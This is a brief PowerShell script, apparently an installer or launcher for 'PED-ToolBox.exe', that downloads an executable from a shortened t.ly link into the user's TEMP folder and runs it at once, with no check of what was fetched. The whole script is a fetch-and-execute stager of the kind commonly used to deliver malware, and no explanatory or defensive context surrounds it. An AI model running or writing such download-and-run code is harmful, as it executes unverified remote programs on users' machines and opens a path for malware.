#ver-1.0.2.2
#21/08/23/16:28
$fileLinkID = "https://t.ly/pedexe"
$nameFile = "PED-ToolBox.exe"
#$filePath = Join-Path -Path $PWD -ChildPath $nameFile
$filePath = Join-Path -Path $env:TEMP -ChildPath $nameFile

# Download the script
(New-Object System.Net.WebClient).DownloadFile($fileLinkID, $filePath)

# Start the downloaded script
Start-Process -FilePath $filePath

#exit
